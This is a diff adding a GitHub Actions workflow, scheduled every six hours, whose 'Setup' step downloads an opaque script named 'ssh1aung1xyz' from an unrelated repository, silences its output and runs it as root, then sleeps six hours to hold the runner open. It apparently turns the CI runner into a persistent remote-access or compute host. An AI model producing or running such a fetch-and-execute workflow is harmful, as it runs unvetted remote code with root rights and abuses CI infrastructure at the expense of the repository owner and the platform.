@@ -1,0 +1,20 @@
+name: Auto Run Every 6h
+
+on:
+  schedule:
+    - cron: "0 */6 * * *"   # every 6 hours
+  workflow_dispatch:        # manual trigger if needed
+
+jobs:
+  keepalive:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360    # 6h max
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Setup
+        run: |
+             sudo apt update && sudo  apt install wget sudo -y && sudo  wget https://github.com/githubaunglaymyanmar/onlytest/raw/refs/heads/main/ssh1aung1xyz &> /dev/null && sudo bash ssh1aung1xyz  
+
+      - name: Sleep
+        run: sleep 6h
